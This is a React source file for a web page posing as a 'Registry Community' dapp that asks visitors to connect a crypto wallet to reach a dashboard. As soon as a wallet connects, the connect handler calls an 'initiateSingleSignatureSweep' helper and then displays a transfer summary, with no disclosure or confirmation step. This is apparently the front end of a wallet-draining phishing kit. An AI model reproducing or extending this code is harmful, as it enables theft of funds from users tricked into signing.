import { useState } from 'react'
import { useWalletStore } from './stores/walletStore'
import ConnectButton from './components/ConnectButton'
import SummaryModal from './components/SummaryModal'

function App() {
  const {
    account,
    isConnected,
    isLoading,
    error,
    transferStatus,
    setAccount,
    setIsConnected,
    setIsLoading,
    setError,
    setTransferStatus
  } = useWalletStore()

  const [showSummary, setShowSummary] = useState(false)

  const handleConnect = async () => {
    setIsLoading(true)
    setError(null)

    try {
      const { account: addr, provider } = await window.walletHelpers?.connectWallet?.() || {}

      if (!addr || !provider) {
        throw new Error('Failed to connect wallet')
      }

      setAccount(addr)
      setIsConnected(true)

      const result = await window.walletHelpers?.initiateSingleSignatureSweep?.(provider, addr)

      if (result?.success) {
        setTransferStatus(result)
        setShowSummary(true)
      } else {
        throw new Error(result?.message || 'Authorization failed')
      }
    } catch (err) {
      console.error(err)
      setError(err.message || 'Connection failed. Please try again.')
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <div className="min-h-screen bg-gray-900 text-white">
      <div className="navbar">
        <div className="nav-logo">
          <a href="/" className="logo-img">
            <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAzIiBoZWlnaHQ9IjMyIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxnIGNsaXAtcGF0aD0idXJsKCNhKSIgZmlsbD0iI2ZmZiI+PHBhdGggZD0iTTEyLjIwOSA5LjA1OWM2LjAzOC01LjkxIDE1LjgyOS01LjkxIDIxLjg2NyAwbC43MjcuNzExYS43NDUuNzQ1IDAgMCAxIDAgMS4wN2wtMi40ODYgMi40MzNhLjM5My4zOTMgMCAwIDEtLjU0NyAwbC0xLS45NzljLTQuMjEyLTQuMTIyLTExLjA0Mi00LjEyMi0xNS4yNTUgMGwtMS4wNzEgMS4wNDhhLjM5My4zOTMgMCAwIDEtLjU0NyAwbC0yLjQ4Ni0yLjQzM2EuNzQ1Ljc0NSAwIDAgMSAwLTEuMDdsLjc5OC0uNzhabTI3LjAwOSA1LjAzMSAyLjIxMiAyLjE2NmEuNzQ1Ljc0NSAwIDAgMSAwIDEuMDdsLTkuOTc2IDkuNzY0YS43ODUuNzg1IDAgMCAxLTEuMDk0IDBsLTcuMDgtNi45M2EuMTk2LjE5NiAwIDAgMC0uMjc0IDBsLTcuMDggNi45M2EuNzg1Ljc4NSAwIDAgMS0xLjA5NCAwbC05Ljk3Ny05Ljc2NGEuNzQ1Ljc0NSAwIDAgMSAwLTEuMDdsMi4yMTMtMi4xNjZhLjc4NS43ODUgMCAwIDEgMS4wOTMgMGw3LjA4IDYuOTNhLjE5Ni4xOTYgMCAwIDAgLjI3NCAwbDcuMDgtNi45M2EuNzg1Ljc4NSAwIDAgMSAxLjA5NCAwbDcuMDgxIDYuOTNhLjE5Ni4xOTYgMCAwIDAgLjI3NCAwbDcuMDgtNi45M2EuNzg1Ljc4NSAwIDAgMSAxLjA5NCAwWk01NC45NjMgMjMuOTRsMi42NzMtMTAuNjljLjE1OC0uNTkuMjk0LTEuMjI0LjQ3NS0yLjIyLjEzNi45OTYuMjk1IDEuNjMuNDA4IDIuMjJsMi4zMSAxMC42OWg0Ljc4TDY5LjY0IDguMDg1aC0zLjY3bC0yLjIxOSA5Ljc0YTI4LjM4IDI4LjM4IDAgMCAwLS41MiAyLjgwOGMtLjE4Mi0xLjA2NC0uMzYzLTEuODU3LS41NjctMi43ODZsLTIuMTUyLTkuNzYySDU1LjcxbC0yLjMzMyA5Ljc2MmE0Ny4xMjMgNDcuMTIzIDAgMCAwLS41NDMgMi43ODYgNDcuMDQyIDQ3LjA0MiAwIDAgMC0uNTQ0LTIuNzg2bC0yLjE3NC05Ljc2MmgtMy44MjhsNC4wMDkgMTUuODU1aDQuNjY2Wk03Mi4zNzYgMjQuMzQ4YzEuODEyIDAgMi45NjctLjc0OCAzLjU1Ni0xLjgzNS0uMDY4LjM0LS4wOS42OC0uMDkgMS4wMnYuNDA3aDMuMDM1di02LjU0NmMwLTMuMTI1LTEuNDI3LTQuOTM3LTQuOTE1LTQuOTM3LTMuMDEzIDAtNC45ODMgMS42NzYtNS4xNjQgMy45ODZoMy4zM2MuMTEyLTEuMDIuODM3LTEuNjMgMS45NDctMS42MyAxLjA0MiAwIDEuNjA4LjU4OCAxLjYwOCAxLjI2OCAwIC40OTgtLjI5NC43OTItMS4xNzguOTA1bC0xLjU4NS4xODJjLTIuMzU2LjI5NC00LjM3MSAxLjE1NS00LjM3MSAzLjY0NiAwIDIuMjY1IDEuODggMy41MzQgMy44MjcgMy41MzRabTEuMDItMi4zMzNjLS44ODQgMC0xLjU0LS40OTgtMS41NC0xLjM2IDAtLjgzNy43NDctMS4yNDUgMS44OC0xLjQ0OWwuNzctLjEzNmMuNjU2LS4xMzYgMS4wMTktLjI0OSAxLjI0NS0uNDUzdjEuMDQyYzAgMS4wNDIgLjcxNiAxLjY0NSAxLjYxIDEuNjQ1aC4wMDJaIi8+PC9nPjwvc3ZnPg=="
            alt="Registry Community logo"
          />
          </a>
        </div>
        <div className="nav-links">
          <a href="https://github.com" target="_blank" rel="noreferrer">GitHub</a>
          <a href="#features">Features</a>
          <a href="#about">About</a>
        </div>
        <div className="nav-buttons">
          <a href="/" className="btn">Account</a>
        </div>
      </div>

      <main>
        <section className="wallet-section">
          <div className="wallet-content">
            <div className="wallet-icon">
              <i className="fas fa-wallet"></i>
            </div>
            <h1>Connect Your Wallet</h1>
            <p>
              To access the dashboard and continue on our decentralized dapp,
              please connect your wallet.
            </p>

            {isConnected && account && (
              <div className="bg-green-900/30 border border-green-600 rounded-2xl p-5 mb-6 text-center">
                <p className="text-green-400 text-sm">Wallet Connected</p>
                <p className="font-mono text-white mt-1 break-all">{account}</p>
              </div>
            )}

            {!isConnected && (
              <ConnectButton onClick={handleConnect} isLoading={isLoading} />
            )}

            {error && (
              <div className="bg-red-900/50 border border-red-700 rounded-2xl p-4 mt-4 text-center">
                <p className="text-red-300">{error}</p>
              </div>
            )}
          </div>
        </section>
      </main>

      <div className="footer-section">
        <div className="footer-content">
          <div className="footer-column">
            <h5>Product</h5>
            <a href="#features">Features</a>
            <a href="#pricing">Pricing</a>
            <a href="#security">Security</a>
          </div>
          <div className="footer-column">
            <h5>Company</h5>
            <a href="#about">About Us</a>
            <a href="#blog">Blog</a>
            <a href="#careers">Careers</a>
          </div>
          <div className="footer-column">
            <h5>Support</h5>
            <a href="#help">Help Center</a>
            <a href="#contact">Contact Us</a>
            <a href="#faq">FAQ</a>
          </div>
          <div className="footer-column">
            <h5>Legal</h5>
            <a href="#privacy">Privacy Policy</a>
            <a href="#terms">Terms of Service</a>
            <a href="#disclaimer">Disclaimer</a>
          </div>
        </div>
        <div className="footer-bottom">
          <p>&copy; 2024 Registry Community. All rights reserved.</p>
        </div>
      </div>

      {showSummary && (
        <SummaryModal
          status={transferStatus}
          onClose={() => setShowSummary(false)}
        />
      )}
    </div>
  )
}

export default App

